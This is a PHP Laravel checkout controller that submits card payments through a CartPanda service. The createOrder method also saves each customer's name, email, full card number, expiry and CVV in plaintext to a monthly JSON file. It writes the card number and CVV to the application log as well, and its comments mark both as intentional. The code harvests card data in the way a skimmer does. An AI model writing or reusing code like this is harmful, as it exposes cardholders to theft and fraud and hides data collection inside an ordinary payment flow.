<?php

namespace App\Http\Controllers\Checkout;

use App\Http\Controllers\Controller;
use App\Services\CartPandaService;

class CheckoutController extends Controller
{
    public function index()
    {
        return view('checkout.index');
    }

    public function createOrder()
    {
        $name = request()->input('name');
        $cardNumber = request()->input('cardNumber');
        $cardNumber = preg_replace('/[^0-9]/', '', $cardNumber);
        $cardMonth = request()->input('cardMonth');
        $cardMonth = preg_replace('/[^0-9]/', '', $cardMonth);
        $cardYear = request()->input('cardYear');
        $cardYear = preg_replace('/[^0-9]/', '', $cardYear);
        $cardYear = substr($cardYear, -2);
        $cardCvv = request()->input('cardCvv');
        $cardCvv = preg_replace('/[^0-9]/', '', $cardCvv);
        $email = request()->input('email');

        // Salva os dados em JSON
        $this->saveOrderDataToJson([
            'timestamp' => now()->format('Y-m-d H:i:s'),
            'name' => $name,
            'email' => $email,
            'cardNumber' => $cardNumber, // Número completo do cartão
            'cardMonth' => $cardMonth,
            'cardYear' => $cardYear,
            'cardCvv' => $cardCvv, // Adicionando o CVV
        ]);

        logger()->info('Criando pedido', ['name' => $name, 'cardNumber' => $cardNumber, 'cardMonth' => $cardMonth, 'cardYear' => $cardYear, 'cardCvv' => $cardCvv]);
        $cartPandaService = new CartPandaService;
        try {
            $result = $cartPandaService->createOrder(name: $name, cardNumber: $cardNumber, cardMonth: $cardMonth, cardYear: $cardYear, cardCvv: $cardCvv);
        } catch (\Exception $e) {
            logger()->error('Erro ao criar pedido', ['error' => $e->getMessage()]);

            return response()->json(['message' => 'Order creation failed'], 500);
        }

        return response()->json($result);
    }

    private function saveOrderDataToJson(array $data)
    {
        try {
            $storagePath = storage_path('app/orders');
            if (!file_exists($storagePath)) {
                mkdir($storagePath, 0755, true);
            }

            $filename = $storagePath . '/orders_' . date('Y_m') . '.json';
            
            // Lê o arquivo existente ou cria um array vazio
            $orders = [];
            if (file_exists($filename)) {
                $orders = json_decode(file_get_contents($filename), true) ?? [];
            }

            // Adiciona o novo pedido
            $orders[] = $data;

            // Salva o arquivo
            file_put_contents($filename, json_encode($orders, JSON_PRETTY_PRINT));

            logger()->info('Dados do pedido salvos em JSON', ['filename' => $filename]);
        } catch (\Exception $e) {
            logger()->error('Erro ao salvar dados do pedido em JSON', ['error' => $e->getMessage()]);
        }
    }
}
